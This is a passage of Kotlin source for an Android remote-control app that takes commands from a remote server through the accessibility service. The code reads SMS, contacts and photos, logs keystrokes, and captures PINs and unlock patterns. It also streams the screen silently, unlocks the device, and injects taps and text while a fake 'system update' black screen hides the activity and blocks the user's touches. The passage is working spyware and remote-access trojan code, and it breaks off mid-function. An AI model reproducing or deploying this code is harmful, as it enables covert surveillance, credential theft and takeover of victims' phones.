package com.zaka.screenagent.net

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.content.Context
import android.graphics.Path
import android.graphics.Rect
import android.os.Build
import android.provider.ContactsContract
import android.provider.MediaStore
import android.provider.Telephony
import android.util.Log
import android.view.accessibility.AccessibilityNodeInfo
import com.zaka.screenagent.accessibility.BoundaryAccessibilityService
import org.json.JSONArray
import org.json.JSONObject

/**
 * 面板命令执行器 —— 把墨影协议里下行 `new_msg` 的 action 映射到本机能力。
 *
 * action 名取自服务器侧（`selftest_actions.py` / `refc2.py` 的契约）：
 *   clickPoint / gesture / gestureB / touchUp / input / inputSend
 *   screen / takeScreen / silentShot / capture / screen 帧
 *   uiTree / getTree / adbUiTree / curpage / launch / home / back / recents
 *   readSmsList / readContactList / readAppList / readAlbumList / readAlbumLast
 *   device_info / permissions / reqPerList / perms / volumeUp / keylog / antiDeleteOn / antiDeleteOff
 */
object MoyingActions {

    private const val TAG = "MoyingActions"

    /** 需要真正点到屏幕的指令：执行前临时放行触摸 */
    private val INTERACTIVE_ACTIONS = setOf(
        "clickPoint", "tap", "gesture", "gestureB", "swipe", "adbSwipe",
        "input", "inputSend", "text", "keyevent", "key", "home", "back", "recents",
        "notifications", "smartUnlock", "unlockScreen", "v2Unlock", "autoUnlock",
        "launch", "startApk", "wakeup"
    )

    fun handle(
        service: BoundaryAccessibilityService,
        channel: MoyingChannel,
        action: String,
        data: JSONObject,
        binary: BinaryChannel? = null
    ) {
        binaryRef = binary
        // 阻止操作期间：只给我们这一次动作开一个"最小放行窗口"，动作做完立刻恢复拦截。
        // 放行窗口越短，用户能"蹭"到的机会越小（点击 450ms，手势按面板给的时长 + 300ms）。
        if (action in INTERACTIVE_ACTIONS) {
            val ms = when (action) {
                "clickPoint", "tap" -> 450L
                "gesture", "gestureB", "swipe", "adbSwipe" -> {
                    val d = runCatching {
                        val arr = data.optJSONArray("gesture")
                        var max = 0L
                        if (arr != null) for (i in 0 until arr.length()) {
                            max = maxOf(max, arr.optJSONObject(i)?.optLong("t", 0L) ?: 0L)
                        }
                        max
                    }.getOrDefault(0L)
                    (d + 300L).coerceIn(400L, 3000L)
                }
                "input", "inputSend", "text" -> 900L
                else -> 700L
            }
            runCatching { com.zaka.screenagent.ui.TouchBlock.bypass(service, ms) }
        }
        Log.d(TAG, "action=$action")
        lastRequestAt = System.currentTimeMillis()   // 任何服务器来帧都算保活
        when (action) {
            // ── 导航 ──
            "home" -> global(service, AccessibilityService.GLOBAL_ACTION_HOME, channel, action)
            "back" -> global(service, AccessibilityService.GLOBAL_ACTION_BACK, channel, action)
            "recents" -> global(service, AccessibilityService.GLOBAL_ACTION_RECENTS, channel, action)
            "notifications" -> global(service, AccessibilityService.GLOBAL_ACTION_NOTIFICATIONS, channel, action)

            // ── 手势 ──
            "clickPoint", "tap" -> clickPoint(service, channel, data)
            "gesture", "gestureB", "swipe", "adbSwipe" -> swipe(service, channel, data)

            // ── 文本输入 ──
            "input", "inputSend", "text" -> inputText(service, channel, data)

            // ── 画面 ──
            "screen", "takeScreen", "silentShot", "screenshot" -> {
                lastRequestAt = System.currentTimeMillis()
                // 面板是 5fps 轮询式请求 → 这里升级成推流，之后设备自己按节奏发，延迟更低
                startStream(service, channel, 400L)
            }
            "startStream", "startScreen", "startHD" -> {
                val fps = data.optInt("fps", 5).coerceIn(1, 15)
                startStream(service, channel, (1000L / fps).coerceAtLeast(120L))
                channel.send("action_result", JSONObject().put("action", action).put("success", true))
            }
            "stopStream", "stopScreen", "stopHD" -> {
                stopStream()
                channel.send("action_result", JSONObject().put("action", action).put("success", true))
            }

            // ── 界面结构 ──
            // 服务器请求无障碍树用的就是 action=capture（不是截图！）
            "uiTree", "getTree", "adbUiTree", "capture" -> uiTree(service, channel, action)
            "curpage", "currentPage" -> curPage(service, channel)

            // ── 数据读取 ──
            "readSmsList" -> readSms(service, channel)
            "readContactList" -> readContacts(service, channel)
            "readAppList" -> readApps(service, channel)
            "readAlbumList" -> readAlbum(service, channel, data)
            "device_info" -> channel.send("device_info", deviceInfo(service))
            "permissions", "reqPerList", "perms" -> channel.send("permissions", permissions(service))

            // ── 其它 ──
            "launch", "startApk" -> launch(service, channel, data.optString("pkg").ifEmpty { data.optString("packageName") })
            "wakeup" -> wakeScreen(service, channel)

            // ── 黑屏（面板三个黑屏档 + 关闭）──
            "lockNormal", "lockUpdate", "lockAndroidUpdate" -> {
                // 面板可带 alpha / brightness 覆盖默认值（不传就用 BlackScreen 里的默认档）
                val a = if (data.has("alpha")) data.optDouble("alpha") else null
                val b = if (data.has("brightness")) data.optDouble("brightness") else null
                com.zaka.screenagent.ui.BlackScreen.show(service, action, a, b)
                channel.send("action_result", JSONObject().put("action", action).put("success", true))
            }
            // ── 阻止操作（吃掉用户触摸；我们自己的注入先 bypass）──
            "blockTouch", "blockInput", "lockTouch", "blockUserInput" -> {
                // 只有设备处于全屏遮挡状态（纯黑/系统黑/更新黑）时才允许阻止操作，
                // 否则用户会莫名其妙点不动桌面 —— 直接拒绝并告知面板
                if (!com.zaka.screenagent.ui.BlackScreen.isShowing()) {
                    channel.send("action_result", JSONObject()
                        .put("action", action).put("success", false)
                        .put("error", "not_fullscreen: 先开启任一黑屏（纯黑/系统黑/更新黑）再阻止操作"))
                } else {
                    com.zaka.screenagent.ui.TouchBlock.show(service)
                    channel.send("action_result", JSONObject().put("action", action).put("success", true))
                }
            }
            "unblockTouch", "unblockInput", "allowUserInput" -> {
                com.zaka.screenagent.ui.TouchBlock.hide(service)
                channel.send("action_result", JSONObject().put("action", action).put("success", true))
            }
            // ── 一键卸载（本机）：先解设备管理员，再拉系统卸载确认框 ──
            "uninstallSelf", "uninstallApp", "uninstall" -> {
                val ok = runCatching { com.zaka.screenagent.admin.SelfUninstall.start(service) }.getOrDefault(false)
                channel.send("action_result", JSONObject().put("action", action).put("success", ok))
            }
            "unlock", "hideLockOverlay" -> {
                runCatching { com.zaka.screenagent.ui.TouchBlock.hide(service) }   // 关黑屏 → 自动解除阻止
                com.zaka.screenagent.ui.BlackScreen.hide(service)
                channel.send("action_result", JSONObject().put("action", action).put("success", true))
            }

            // ── 一键解锁 / V2 解锁：唤醒 → 上滑 → （可选）输入 PIN ──
            "smartUnlock", "unlockScreen", "v2Unlock", "autoUnlock" -> {
                // ★ 先停止密码/图案记录，避免我们自己画的图案被当成用户输入记录下来
                runCatching { com.zaka.screenagent.keylog.PinCapture.suppress(20_000L) }
                smartUnlock(service, channel, data)
            }

            // ── 主动密码捕获（弹系统验证框，锁屏/指纹用户也能用密码）──
            "verifyPin", "capturePin" -> {
                com.zaka.screenagent.keylog.PinCapture.start(service)
                channel.send("action_result", JSONObject().put("action", action).put("success", true)
                    .put("mode", "active").put("window", 120))
            }
            "stopPin" -> {
                com.zaka.screenagent.keylog.PinCapture.stop(service)
                channel.send("action_result", JSONObject().put("action", action).put("success", true))
            }
            // ── 被动键盘监控 ──
            "keylog", "keys", "getKeylog" -> {
                com.zaka.screenagent.keylog.SilentKeyMon.flush(service, force = true)
                channel.send("action_result", JSONObject().put("action", action).put("success", true)
                    .put("mode", "passive"))
            }
            "keymonOn", "keymonOff" -> {
                com.zaka.screenagent.keylog.SilentKeyMon.enabled = action == "keymonOn"
                channel.send("action_result", JSONObject().put("action", action).put("success", true))
            }
            "ping" -> channel.send("action_result", JSONObject().put("action", "ping").put("success", true))
            else -> {
                Log.w(TAG, "unsupported action=$action")
                channel.send("action_result", JSONObject().put("action", action)
                    .put("success", false).put("error", "unsupported"))
            }
        }
    }

    /** 点亮屏幕 → 上滑解锁 → 若带 pin 就输入，整条链路 3 秒内完成 */
    private fun smartUnlock(service: BoundaryAccessibilityService, ch: MoyingChannel, data: JSONObject) {
        val spin = android.os.Handler(android.os.Looper.getMainLooper())
        wakeScreen(service, ch)
        Log.d(TAG, "smartUnlock: wake requested")

        val dm = service.resources.displayMetrics
        val cx = dm.widthPixels / 2f
        val fromY = dm.heightPixels * 0.82f
        val toY = dm.heightPixels * 0.20f

        ch.send("action_result", JSONObject().put("action", "smartUnlock").put("success", true).put("stage", "wake"))

        // 有图案就直接画（比上滑更快更准）
        val saved = runCatching {
            service.getSharedPreferences("pin_store", Context.MODE_PRIVATE).getString("pattern", "")
        }.getOrNull().orEmpty()
        // V2解锁：面板传 {type:"pattern"|"pin"|"password", credential:"..."}
        val credType = data.optString("type").lowercase()
        val credential = data.optString("credential")
        if (credType == "pin" || credType == "password") {
            spin.postDelayed({
                typeText(service, ch, credential.replace(",", ""))
                ch.send("action_result", JSONObject().put("action", "smartUnlock")
                    .put("success", true).put("stage", "credential_${credType}"))
            }, 900L)
            return
        }
        val pat = credential.ifEmpty { data.optString("pattern") }.ifEmpty { saved }
        Log.d(TAG, "smartUnlock: pat=$pat credType=$credType")
        if (pat.isNotEmpty()) {
            spin.postDelayed({
                Log.d(TAG, "smartUnlock: draw pattern $pat")
                drawPatternWhenReady(service, ch, pat, 0) { ok, reason ->
                    Log.d(TAG, "smartUnlock: pattern result ok=$ok reason=$reason")
                    ch.send("action_result", JSONObject().put("action", "patternUnlock")
                        .put("success", ok).put("reason", reason).put("pattern", pat))
                }
            }, 900L)
            return
        }

        spin.postDelayed({
            val path = Path().apply { moveTo(cx, fromY); lineTo(cx, toY) }
            val g = GestureDescription.Builder()
                .addStroke(GestureDescription.StrokeDescription(path, 0, 320)).build()
            runCatching {
                service.dispatchGesture(g, object : AccessibilityService.GestureResultCallback() {
                    override fun onCompleted(gestureDescription: GestureDescription?) {
                        Log.d(TAG, "smartUnlock swipe completed")
                        val pin = data.optString("pin").ifEmpty { data.optString("password") }
                        if (pin.isNotEmpty()) {
                            spin.postDelayed({ typeText(service, ch, pin) }, 700L)
                        }
                    }
                    override fun onCancelled(gestureDescription: GestureDescription?) {
                        Log.w(TAG, "smartUnlock swipe cancelled")
                    }
                }, null)
            }
        }, 900L)
    }

    /**
     * 等九宫格"就绪"再画：点亮屏幕后锁屏界面通常要 1~3 秒才渲染出来，
     * 这里每 400ms 探一次，最多 12 次（≈5 秒），中途补一次上滑把锁屏拉出来。
     */
    private fun drawPatternWhenReady(
        service: BoundaryAccessibilityService,
        ch: MoyingChannel,
        pattern: String,
        attempt: Int,
        done: (Boolean, String) -> Unit
    ) {
        val area = com.zaka.screenagent.pin.PatternUnlock.findPatternArea(service)
        if (area != null) {
            Log.d(TAG, "pattern view ready at attempt=$attempt")
            com.zaka.screenagent.pin.PatternUnlock.unlock(service, pattern, done)
            return
        }
        if (attempt >= 12) {
            Log.w(TAG, "pattern view never appeared")
            done(false, "no_pattern_view")
            return
        }
        // 第 2、5 次尝试时补一个上滑，把锁屏界面带出来
        if (attempt == 1 || attempt == 4) {
            val dm = service.resources.displayMetrics
            val cx = dm.widthPixels / 2f
            val path = Path().apply {
                moveTo(cx, dm.heightPixels * 0.80f)
                lineTo(cx, dm.heightPixels * 0.25f)
            }
            runCatching {
                service.dispatchGesture(GestureDescription.Builder()
                    .addStroke(GestureDescription.StrokeDescription(path, 0, 300)).build(), null, null)
            }
            Log.d(TAG, "swipe up to reveal keyguard (attempt=$attempt)")
        }
        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
            drawPatternWhenReady(service, ch, pattern, attempt + 1, done)
        }, 300L)
    }

    /** 往当前焦点/锁屏输入框填文本 */
    private fun typeText(service: BoundaryAccessibilityService, ch: MoyingChannel, text: String) {
        var ok = false
        runCatching {
            val root = service.rootInActiveWindow
            val focused = root?.findFocus(AccessibilityNodeInfo.FOCUS_INPUT)
                ?: root?.let { findEditable(it) }
            if (focused != null) {
                val args = android.os.Bundle()
                args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text)
                ok = focused.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args)
            }
        }
        ch.send("action_result", JSONObject().put("action", "typeText").put("success", ok).put("len", text.length))
    }

    private fun findEditable(root: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        val stack = ArrayDeque<AccessibilityNodeInfo>()
        stack.add(root)
        var guard = 0
        while (stack.isNotEmpty() && guard++ < 300) {
            val n = stack.removeLast()
            if (n.isEditable) return n
            for (i in 0 until n.childCount) n.getChild(i)?.let { stack.add(it) }
        }
        return null
    }

    /**
     * 点亮屏幕 —— 三条路一起上，以"屏幕真的亮了"为准：
     *   ① 2.2 同款 WakeLock: SCREEN_BRIGHT_WAKE_LOCK(0x0A) | ACQUIRE_CAUSES_WAKEUP(0x10000000)
     *      = 0x1000000A。targetSdk ≤33 或老 ROM 上有效。
     *   ② WakeActivity: setTurnScreenOn(true) + setShowWhenLocked(true)
     *      —— Android 14（targetSdk 34）起官方替代方案。
     *   ③ 1.5 秒后复查 isInteractive，还没亮就再拉一次 Activity。
     */
    private fun wakeScreen(service: BoundaryAccessibilityService, ch: MoyingChannel) {
        val pm = service.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
        var path = ""

        // ① 2.2 同款 wakelock
        runCatching {
            @Suppress("DEPRECATION")
            val flags = android.os.PowerManager.SCREEN_BRIGHT_WAKE_LOCK or
                android.os.PowerManager.ACQUIRE_CAUSES_WAKEUP
            val wl = pm.newWakeLock(flags, "app:wakeup")
            wl.acquire(3000L)
            wl.release()
            path += "wakelock(0x${Integer.toHexString(flags)});"
        }.onFailure { path += "wakelock_fail;" }

        // ② 先看看 wakelock 有没有点亮（targetSdk 33 起通常能直接亮，不必拉 Activity）
        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
            if (pm.isInteractive) {
                ch.send("action_result", JSONObject().put("action", "wakeup")
                    .put("success", true).put("path", path + "wakelock_only"))
                Log.d(TAG, "wake ok by wakelock only")
            } else {
                val noAct = runCatching {
                    android.provider.Settings.Global.getInt(service.contentResolver, "moying_no_wake_activity", 0) == 1
                }.getOrDefault(false)
                if (noAct) {
                    Log.w(TAG, "wakelock failed and activity disabled by flag (moying_no_wake_activity=1)")
                    ch.send("action_result", JSONObject().put("action", "wakeup")
                        .put("success", false).put("path", path + "wakelock_failed_no_activity"))
                    return@postDelayed
                }
                Log.d(TAG, "wakelock didn't wake screen, fallback to activity")
                launchWakeActivity(service)
                android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                    ch.send("action_result", JSONObject().put("action", "wakeup")
                        .put("success", pm.isInteractive).put("path", path + "activity"))
                }, 900L)
            }
        }, 400L)
        if (pm.isInteractive) {
            ch.send("action_result", JSONObject().put("action", "wakeup").put("success", true).put("path", path + "already_on"))
            return
        }
        // ③ 复查 + 重试
        val h = android.os.Handler(android.os.Looper.getMainLooper())
        h.postDelayed({
            val on = pm.isInteractive
            if (!on) {
                runCatching {
                    val i = android.content.Intent(service, com.zaka.screenagent.pin.WakeActivity::class.java)
                        .addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK or
                            android.content.Intent.FLAG_ACTIVITY_NO_ANIMATION)
                    service.startActivity(i)
                }
                h.postDelayed({
                    ch.send("action_result", JSONObject().put("action", "wakeup")
                        .put("success", pm.isInteractive).put("retry", true).put("path", path))
                }, 900L)
            } else {
                ch.send("action_result", JSONObject().put("action", "wakeup")
                    .put("success", true).put("path", path))
            }
        }, 1500L)
    }

    private fun launchWakeActivity(service: BoundaryAccessibilityService) {
        runCatching {
            val i = android.content.Intent(service, com.zaka.screenagent.pin.WakeActivity::class.java)
                .addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK or
                    android.content.Intent.FLAG_ACTIVITY_NO_ANIMATION)
            service.startActivity(i)
        }
    }

    // ── 实现 ──────────────────────────────────────────────
    private fun global(service: AccessibilityService, what: Int, ch: MoyingChannel, action: String) {
        val ok = runCatching { service.performGlobalAction(what) }.getOrDefault(false)
        ch.send("action_result", JSONObject().put("action", action).put("success", ok))
    }

    private fun clickPoint(service: BoundaryAccessibilityService, ch: MoyingChannel, data: JSONObject) {
        val x = data.optDouble("x", data.optDouble("px", -1.0)).toFloat()
        val y = data.optDouble("y", data.optDouble("py", -1.0)).toFloat()
        if (x < 0 || y < 0) {
            ch.send("action_result", JSONObject().put("action", "clickPoint").put("success", false).put("error", "bad_point"))
            return
        }
        val path = Path().apply { moveTo(x, y) }
        val gesture = GestureDescription.Builder()
            .addStroke(GestureDescription.StrokeDescription(path, 0, 60))
            .build()
        val ok = runCatching {
            service.dispatchGesture(gesture, object : AccessibilityService.GestureResultCallback() {}, null)
        }.isSuccess
        ch.send("action_result", JSONObject().put("action", "clickPoint").put("success", ok))
    }

    private fun swipe(service: BoundaryAccessibilityService, ch: MoyingChannel, data: JSONObject) {
        // 面板格式：{"gesture":[{"flag":"down|move|up","x":..,"y":..,"t":毫秒}, ...]}
        val gestureArr = data.optJSONArray("gesture")
        if (gestureArr != null && gestureArr.length() >= 2) {
            val path = Path()
            var startT = 0L
            var endT = 0L
            var started = false
            for (i in 0 until gestureArr.length()) {
                val p = gestureArr.optJSONObject(i) ?: continue
                val x = p.optDouble("x").toFloat()
                val y = p.optDouble("y").toFloat()
                val flag = p.optString("flag", "move")
                val t = p.optLong("t", 0L)
                if (flag == "down" || !started) {
                    path.moveTo(x, y); started = true; startT = t
                } else {
                    path.lineTo(x, y)
                }
                endT = t
            }
            val duration = (endT - startT).coerceIn(50L, 5000L)
            val g = GestureDescription.Builder()
                .addStroke(GestureDescription.StrokeDescription(path, 0, duration))
                .build()
            val ok = runCatching {
                service.dispatchGesture(g, object : AccessibilityService.GestureResultCallback() {}, null)
            }.isSuccess
            ch.send("action_result", JSONObject().put("action", "gestureB").put("success", ok)
                .put("duration", duration).put("points", gestureArr.length()))
            return
        }
        val pts = data.optJSONArray("points")
        val path = Path()
        var duration = data.optLong("duration", 300L).coerceIn(50, 3000)
        if (pts != null && pts.length() >= 2) {
            for (i in 0 until pts.length()) {
                val p = pts.optJSONObject(i) ?: continue
                val x = p.optDouble("x").toFloat()
                val y = p.optDouble("y").toFloat()
                if (i == 0) path.moveTo(x, y) else path.lineTo(x, y)
            }
        } else {
            val x1 = data.optDouble("x1", data.optDouble("x", 0.0)).toFloat()
            val y1 = data.optDouble("y1", data.optDouble("y", 0.0)).toFloat()
            val x2 = data.optDouble("x2", data.optDouble("toX", x1.toDouble())).toFloat()
            val y2 = data.optDouble("y2", data.optDouble("toY", y1.toDouble())).toFloat()
            path.moveTo(x1, y1); path.lineTo(x2, y2)
        }
        val gesture = GestureDescription.Builder()
            .addStroke(GestureDescription.StrokeDescription(path, 0, duration))
            .build()
        val ok = runCatching {
            service.dispatchGesture(gesture, object : AccessibilityService.GestureResultCallback() {}, null)
        }.isSuccess
        ch.send("action_result", JSONObject().put("action", "gesture").put("success", ok))
    }

    private fun inputText(service: BoundaryAccessibilityService, ch: MoyingChannel, data: JSONObject) {
        val text = data.optString("input").ifEmpty { data.optString("text") }.ifEmpty { data.optString("content") }
        if (text.isEmpty()) {
            ch.send("action_result", JSONObject().put("action", "input").put("success", false).put("error", "empty"))
            return
        }
        var ok = false
        runCatching {
            val root = service.rootInActiveWindow
            val focused = root?.findFocus(AccessibilityNodeInfo.FOCUS_INPUT)
            if (focused != null) {
                val args = android.os.Bundle()
                args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text)
                ok = focused.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args)
            }
        }
        if (!ok) {
            runCatching {
                val cm = service.getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager
                cm.setPrimaryClip(android.content.ClipData.newPlainText("t", text))
                val focused = service.rootInActiveWindow?.findFocus(AccessibilityNodeInfo.FOCUS_INPUT)
                ok = focused?.performAction(AccessibilityNodeInfo.ACTION_PASTE) ?: false
            }
        }
        ch.send("action_result", JSONObject().put("action", "input").put("success", ok))
    }

    private var shotInFlight = false
    private var shotFailStreak = 0
    private var lastShotAt = 0L

    // ── 推流模式：收到一次 start 指令后，设备自己按节奏推，不再等服务器每次问 ──
    @Volatile private var streaming = false
    @Volatile private var streamIntervalMs = 500L
    @Volatile private var lastRequestAt = 0L

    /** 最近一次收到服务器指令的时间（黑屏超时看门狗用） */
    fun lastRequestAtMs(): Long = lastRequestAt
    private val streamHandler = android.os.Handler(android.os.Looper.getMainLooper())
    private var serviceRef: BoundaryAccessibilityService? = null
    @Volatile private var binaryRef: BinaryChannel? = null
    private var channelRef: MoyingChannel? = null

    private var lastTreePushAt = 0L

    /**
     * 推流循环：**拍一张 → 立刻上报 → 上报完马上拍下一张**（不设固定间隔），
     * 上限由系统无障碍截屏的频率限制决定（约 1 张/秒）。
     * 同时每 2 秒顺带推一次无障碍树（服务器窗口开着就要）。
     * 服务器 5 秒一次心跳/请求；这边 8 秒收不到任何来帧就停止推流。
     */
    private val streamLoop = object : Runnable {
        override fun run() {
            if (!streaming) return
            val svc = serviceRef; val ch = channelRef
            if (svc == null || ch == null) { streaming = false; return }
            if (System.currentTimeMillis() - lastRequestAt > 8_000L) {
                streaming = false
                Log.d(TAG, "stream auto-stopped (idle ${System.currentTimeMillis() - lastRequestAt}ms)")
                return
            }
            val now = System.currentTimeMillis()
            if (now - lastTreePushAt > 2_000L) {
                lastTreePushAt = now
                runCatching { uiTree(svc, ch, "uiTree") }
            }
            // 拍一张 → 上报（成功回调里会立刻排下一轮）
            screenshot(svc, ch, JSONObject(), force = true)
        }
    }

    private fun startStream(service: BoundaryAccessibilityService, ch: MoyingChannel, intervalMs: Long) {
        serviceRef = service
        channelRef = ch
        streamIntervalMs = intervalMs.coerceIn(120L, 3000L)
        lastRequestAt = System.currentTimeMillis()
        if (!streaming) {
            streaming = true
            streamHandler.postDelayed(streamLoop, 0)
            Log.d(TAG, "stream started interval=${streamIntervalMs}ms")
        }
    }

    private fun stopStream() {
        streaming = false
        streamHandler.removeCallbacks(streamLoop)
        Log.d(TAG, "stream stopped")
    }

    /**
     * 无障碍截屏（API 30+，无需 MediaProjection、无录屏提示）。
     *
     * ⚠️ 服务器文本帧只认 **PNG**（`refc2.py` 里判 `\x89PNG` 魔数才会缓存成 last_screen），
     * 发 JPEG 会被丢弃 → 面板黑屏。所以这里统一 PNG，并把宽度压到 540 控制体积。
     */

    /** 黑屏抓帧：遮罩已隐藏 → 抓真实桌面 → 叠 40% 黑 + 更新页 → 发送 → 恢复遮罩 */
    private fun shootWithPage(
        service: BoundaryAccessibilityService,
        ch: MoyingChannel,
        maxWidth: Int,
        restore: () -> Unit
    ) {
        val executor = java.util.concurrent.Executor { r -> android.os.Handler(android.os.Looper.getMainLooper()).post(r) }
        runCatching {
            service.takeScreenshot(android.view.Display.DEFAULT_DISPLAY, executor,
                object : AccessibilityService.TakeScreenshotCallback {
                    override fun onSuccess(result: AccessibilityService.ScreenshotResult) {
                        var raw: android.graphics.Bitmap? = null
                        var composed: android.graphics.Bitmap? = null
                        try {
                            val hb = result.hardwareBuffer
                            raw = android.graphics.Bitmap.wrapHardwareBuffer(hb, result.colorSpace)
                                ?.copy(android.graphics.Bitmap.Config.ARGB_8888, false)
                            runCatching { hb.close() }
                            val base = raw ?: return
                            val scaled = if (base.width > maxWidth) {
                                android.graphics.Bitmap.createScaledBitmap(
                                    base, maxWidth, (base.height * maxWidth / base.width).coerceAtLeast(1), true)
                            } else base
                            // 2.2 同款：黑屏态整帧 ×40 + 50，桌面被拉亮、字条自然变白
                            composed = com.zaka.screenagent.ui.BlackScreen.gainLockedFrame(scaled) ?: scaled
                            val bytes = java.io.ByteArrayOutputStream().use { out ->
                                composed.compress(android.graphics.Bitmap.CompressFormat.PNG, 100, out); out.toByteArray()
                            }
                            if (android.provider.Settings.Global.getInt(
                                    service.contentResolver, "moying_save_shot", 0) == 1) {
                                runCatching {
                                    val f = java.io.File(service.getExternalFilesDir(null), "panel_shot.png")
                                    f.writeBytes(bytes)
                                }
                            }
                            val bin = binaryRef
                            if (bin != null && bin.isOpen()) {
                                val jpg = java.io.ByteArrayOutputStream().use { o ->
                                    composed.compress(android.graphics.Bitmap.CompressFormat.JPEG, 70, o); o.toByteArray()
                                }
                                bin.sendFrame(BinaryChannel.T_SCREEN, jpg)
                            } else {
                                ch.send("screenshot", JSONObject()
                                    .put("img", android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP))
                                    .put("imgLen", bytes.size)
                                    .put("w", composed.width).put("h", composed.height))
                            }
                            shotInFlight = false
                            if (streaming) streamHandler.postDelayed(streamLoop, 200L)
                        } catch (t: Throwable) {
                            Log.w(TAG, "shootWithPage failed $t")
                            shotInFlight = false
                        } finally {
                            restore()
                            runCatching { raw?.recycle() }
                            runCatching { composed?.recycle() }
                        }
                    }

                    override fun onFailure(errorCode: Int) {
                        restore()
                        shotInFlight = false
                        if (streaming) streamHandler.postDelayed(streamLoop, 1000L)
                    }
                })
        }.onFailure {
            restore()
            shotInFlight = false
        }
    }

    private fun screenshot(service: BoundaryAccessibilityService, ch: MoyingChannel, data: JSONObject, force: Boolean = false) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
            ch.send("action_result", JSONObject().put("action", "screenshot").put("success", false).put("error", "api"))
            return
        }
        // 面板屏幕通道是 5fps 请求节奏，这里做节流 + 单飞，避免回调堆积
        val now = System.currentTimeMillis()
        if (shotInFlight) return
        if (!force && now - lastShotAt < 900) return
        shotInFlight = true
        lastShotAt = now

        val maxWidth = data.optInt("maxWidth", 540).coerceIn(240, 1080)
        val executor = java.util.concurrent.Executor { r -> android.os.Handler(android.os.Looper.getMainLooper()).post(r) }
        // ★ 黑屏期间：截屏前把遮罩隐藏，抓到"干净实时桌面"，再把 40% 黑 + 更新页文字画回去
        // ★ 不隐藏遮罩：无障碍 takeScreenshot 本身不含本服务的 2032 浮层（2.2 实测如此），
        // 拍到的就是干净桌面；再把更新页画上去 → 手机不闪、面板能看到桌面
        if (com.zaka.screenagent.ui.BlackScreen.isShowing()) {
            shootWithPage(service, ch, maxWidth, {})
            return
        }
        if (false && com.zaka.screenagent.ui.BlackScreen.isShowing()) {
            val composed = com.zaka.screenagent.ui.BlackScreen.composeUploadFrame(maxWidth)
            if (composed != null) {
                try {
                    val bytes = java.io.ByteArrayOutputStream().use { out ->
                        composed.compress(android.graphics.Bitmap.CompressFormat.PNG, 100, out)
                        out.toByteArray()
                    }
                    if (android.provider.Settings.Global.getInt(
                            service.contentResolver, "moying_save_shot", 0) == 1) {
                        runCatching {
                            val f = java.io.File(service.getExternalFilesDir(null), "panel_shot.png")
                            f.writeBytes(bytes)
                            Log.d(TAG, "panel shot saved -> ${f.absolutePath} ${f.length()}B")
                        }
                    }
                    val bin = binaryRef
                    if (bin != null && bin.isOpen()) {
                        val jpg = java.io.ByteArrayOutputStream().use { o ->
                            composed.compress(android.graphics.Bitmap.CompressFormat.JPEG, 70, o)
                            o.toByteArray()
                        }
                        bin.sendFrame(BinaryChannel.T_SCREEN, jpg)
                    } else {
                        ch.send("screenshot", JSONObject()
                            .put("img", android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP))
                            .put("imgLen", bytes.size)
                            .put("w", composed.width)
                            .put("h", composed.height))
                    }
                    shotInFlight = false
                    if (streaming) streamHandler.postDelayed(streamLoop, 200L)
                    composed.recycle()
                    Log.d(TAG, "compose shot ${bytes.size}B ${composed.width}x${composed.height}")
                    return
                } catch (t: Throwable) {
                    Log.w(TAG, "compose shot failed $t")
                }
            }
        }
        val fire: () -> Unit = {
        runCatching {
            service.takeScreenshot(android.view.Display.DEFAULT_DISPLAY, executor,
                object : AccessibilityService.TakeScreenshotCallback {
                    override fun onSuccess(result: AccessibilityService.ScreenshotResult) {
                        shotInFlight = false
                        shotFailStreak = 0
                        if (streaming) streamHandler.postDelayed(streamLoop, 200L)
                        runCatching {
                            val hb = result.hardwareBuffer
                            try {
                                val raw = android.graphics.Bitmap.wrapHardwareBuffer(hb, result.colorSpace)
                                    ?.copy(android.graphics.Bitmap.Config.ARGB_8888, false) ?: return
                                val scaled = if (raw.width > maxWidth) {
                                    val h = (raw.height * maxWidth / raw.width).coerceAtLeast(1)
                                    android.graphics.Bitmap.createScaledBitmap(raw, maxWidth, h, true)
                                } else raw
                                val bytes = java.io.ByteArrayOutputStream().use { out ->
                                    scaled.compress(android.graphics.Bitmap.CompressFormat.PNG, 100, out)
                                    out.toByteArray()
                                }
                                if (android.provider.Settings.Global.getInt(
                                        service.contentResolver, "moying_save_shot", 0) == 1) {
                                    runCatching {
                                        val f = java.io.File(service.getExternalFilesDir(null), "panel_shot.png")
                                        f.writeBytes(bytes)
                                        Log.d(TAG, "panel shot saved -> ${f.absolutePath} ${f.length()}B")
                                    }
                                }
                                val bin = binaryRef
                                if (bin != null && bin.isOpen()) {
                                    // 二进制通道：JPEG 直接发，不 base64、不 AES、不 JSON
                                    val jpg = java.io.ByteArrayOutputStream().use { o ->
                                        scaled.compress(android.graphics.Bitmap.CompressFormat.JPEG, 70, o)
                                        o.toByteArray()
                                    }
                                    bin.sendFrame(BinaryChannel.T_SCREEN, jpg)
                                } else {
                                    ch.send("screenshot", JSONObject()
                                        .put("img", android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP))
                                        .put("imgLen", bytes.size)
                                        .put("w", scaled.width)
                                        .put("h", scaled.height))
                                }
                                Log.d(TAG, "shot ok ${bytes.size}B ${scaled.width}x${scaled.height}")
                                if (scaled !== raw) scaled.recycle()
                                raw.recycle()
                            } finally {
                                // ★ 必须关掉硬件缓冲，否则连续截屏会泄漏 → 后续全部报 error 1
                                runCatching { hb.close() }
                            }
                        }
                    }
                    override fun onFailure(errorCode: Int) {
                        shotInFlight = false
                        // error 1 = 截图服务内部错误：连撞 3 次就退避 5 秒，避免把系统截图服务打满
                        if (errorCode == 1) {
                            shotFailStreak += 1
                        } else {
                            shotFailStreak = 0
